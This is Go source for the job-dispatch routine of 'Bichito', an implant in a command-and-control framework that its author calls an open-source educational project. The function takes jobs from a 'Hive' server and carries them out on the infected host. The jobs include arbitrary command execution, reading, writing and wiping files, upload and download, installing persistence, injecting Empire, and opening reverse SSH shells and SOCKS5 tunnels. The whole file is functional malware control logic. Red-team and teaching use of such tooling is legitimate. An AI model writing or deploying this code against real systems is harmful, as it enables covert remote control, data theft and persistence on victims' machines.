//{{{{{{{ Bichito Jobs Functions }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (
	"bichito/modules/biterpreter"
	"bichito/modules/persistence"
	"time"
	"strconv"
	"strings"
	"os"
	//Debug
	"fmt"

)

//Global var to note if implant was correcrly checked against Hive
var received bool = false

/*
Description: Implant Routine to process Jobs retrieve from Hive
Flow:
A.
*/
func jobProcessor(){

	//Part of the check-in routine, send the BID to Hive
	if ((len(jobsToProcess.Jobs) == 0) && (!received)) {
		
		ping := Job{"","","",bid,"BiPing","","","",""}
		jobsToHive.mux.Lock()
		defer jobsToHive.mux.Unlock()
		jobsToHive.Jobs = append(jobsToHive.Jobs,&ping)
		return
	}

	contChannel := make(chan string, 1)
	biJobTimeout := time.NewTimer(time.Duration(30) * time.Second)
	var result,timeR string
	var error bool
	
	//Loop over the Jobs to be processed
	for _,job := range jobsToProcess.Jobs{

		//Debug:
		fmt.Println(job.Job)
		//Stop buffering pings once we know we are in Hive DB (to reduce overhead)
		if job.Job == "received"{
			received = true
			break
		}

		go func() {
		  	
		   	switch job.Job{
		   	
		   		// Implant Lifecycle
		   		
		   		case "respTime":

		   			i, err := strconv.Atoi(job.Parameters)
		   			if err != nil{
						result = "Error Converting resptime string to int:"+ err.Error()
					}

					resptime = i
		   			ttl = ttl + resptime
		   			result = "RespTime changed to "+job.Parameters+" seconds"
		   			contChannel <- "continue"
		   		
		   		case "ttl":

		   			i, err := strconv.Atoi(job.Parameters)
		   			if err != nil{
						result = "Error Converting ttl string to int:"+ err.Error()
					}

					ttl = i
		   			result = "TTL changed to "+job.Parameters+" seconds"
		   			contChannel <- "continue"

		   		case "persistence":
		   			
		   			if !persisted {

		   				blob := job.Result
		   				error,result = persistence.AddPersistence(biconfig.Persistence,blob)
		   				if error{
							result = "Error Executing Persistence:"+ result
						}else{
							result = "Bichito Already persisted in target bot"+ result
						}

						//Independently of the result, set persisted to true to avoid endless persistence loop
						persisted = true
					}

		   			contChannel <- "continue"

		   		case "removeInfection":
		   			
		   			err,res := RemoveInfection()			
		   			
		   			if err{
						result = "Error Removing Persistence:"+res
					}else{
						result = "Persistence Removed:"+res
					}

		   			contChannel <- "continue"

		   		case "kill":
		   			
		   			os.Exit(1)   			

		   			contChannel <- "continue"

		   		// Implant Basic Capabilities
		   		case "sysinfo":

		   			error,result = biterpreter.Sysinfo()
		   			if error{
						result = "Error Getting System Info:"+result
					}
		   			contChannel <- "continue"

		   		
		   		case "exec":
		   			error,result = biterpreter.Exec(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		
		   		case "ls":
		   			error,result = biterpreter.List(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		
		   		case "accesschk":
		   			
		   			arguments := strings.Split(job.Parameters," ")
    				if len(arguments) != 1 {
        				result = "Incorrect Number of params"
    				}

		   			error,result = biterpreter.Accesschk(arguments[0])
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		
		   		case "read":
		   			error,result = biterpreter.Read(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "write":
		   			error,result = biterpreter.Write(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "wipe":
		   			error,result = biterpreter.Wipe(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "upload":
		   			
		   			arguments := strings.Split(job.Parameters," ")
		   			destinyPath := arguments[1]
		   			blob := job.Result 
		   			//Debug:
		   			//fmt.Println(len(blob))
		   			error,result = biterpreter.Upload(destinyPath,blob)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "download":
		   			
		   			arguments := strings.Split(job.Parameters," ")
		   			destinyPath := arguments[0]
		   			error,result = biterpreter.Download(destinyPath)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"


		   		//Staging/POST Actions - Userland
		   		case "injectEmpire":

		   			error,result = biterpreter.InjectEmpire(job.Parameters)
		   			if error{
						result = "Error Injecting Empire:"+ result
					}
		   			contChannel <- "continue"

		   		case "injectRevSshShell":

		   			error,result = biterpreter.RevSshShell(job.Parameters)
		   			if error{
						result = "Error Injecting Reverse SSH Shell:"+ result
					}
		   			contChannel <- "continue"

		   		case "injectRevSshSocks5":

		   			error,result = biterpreter.RevSshSocks5(job.Parameters)
		   			if error{
						result = "Error Injecting Reverse SSH Socks5:"+ result
					}
		   			contChannel <- "continue"

		   		//Elevate

		   		//SYSTEM Actions
		   		//Inject other user process, root persistence,...

		   		default:
		   			result = "Void No Job Inplemented"
		   			contChannel <- "continue"		
		   	}

	
		}()

		select{
			case <- contChannel:
						
		   			timeR = time.Now().Format("02/01/2006 15:04:05 MST")
		   			
		   			//Check that the size of the Result doesn't exceed 20 MB
		   			bytesResult := len(result)

					if (bytesResult >= 20000000){
						job.Result = "Too Big payload, use staging channel for these sizes"
						job.Status = "Error"
					}else{
						job.Result = result
						job.Status = "Success"	
					}

					job.Time = timeR

					jobsToHive.mux.Lock()
		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
		   			jobsToHive.mux.Unlock()

			case <- biJobTimeout.C:

					timeR = time.Now().Format("02/01/2006 15:04:05 MST")
					job.Result = "Job Timeout"
					job.Status = "Error"
					job.Time = timeR

					jobsToHive.mux.Lock()
		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
		   			jobsToHive.mux.Unlock()

		   			biJobTimeout.Reset(time.Duration(10) * time.Second)

		}

	}

	//Clean all processed jobs
	jobsToProcess.mux.Lock()
	jobsToProcess.Jobs = jobsToProcess.Jobs[:0]
	jobsToProcess.mux.Unlock()
	return
}
